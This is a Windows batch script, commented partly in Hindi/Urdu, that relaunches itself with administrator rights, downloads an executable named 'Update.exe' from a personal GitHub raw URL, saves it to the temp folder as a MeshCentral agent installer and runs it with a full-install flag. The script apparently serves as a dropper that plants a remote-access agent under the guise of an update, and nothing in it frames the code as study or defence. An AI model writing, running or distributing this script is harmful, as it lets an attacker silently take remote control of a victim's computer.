@echo off
setlocal Enabledelayedexpansion

:: ==========================================
:: 1. GITHUB PUBLIC LINK YAHAN PASTE KAREIN
set "URL=https://raw.githubusercontent.com/abrahamgarciaaa1972-ai/In/refs/heads/main/Update.exe"
:: ==========================================

:: Admin Check
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator Permissions...
    :: Re-runs this exact batch file but requests Admin rights automatically
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
    exit /b
)

:: Clear screen after getting Admin permissions
cls
set "DEST_FILE=%TEMP%\meshagent_setup.exe"

echo [1/2] Downloading MeshCentral securely from GitHub...

:: Delete old corrupted file if any
if exist "%DEST_FILE%" del /f /q "%DEST_FILE%"

:: Direct secure file stream download
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%URL%', '%DEST_FILE%')" >nul 2>&1

:: Fallback tool check
if not exist "%DEST_FILE%" (
    curl -s -L -o "%DEST_FILE%" "%URL%" >nul 2>&1
)

:: 2. Launching with verified privileges
if exist "%DEST_FILE%" (
    echo [2/2] Privileges verified. Installing MeshCentral...
    echo ----------------------------------------------------
    
    :: Now it runs flawlessly because the script context has Admin permissions
    "%DEST_FILE%" -fullinstall
    
    echo ----------------------------------------------------
    echo Installation triggered successfully.
    timeout /t 3 >nul
    exit
) else (
    echo ERROR: Download failed. Please check network.
    pause
)
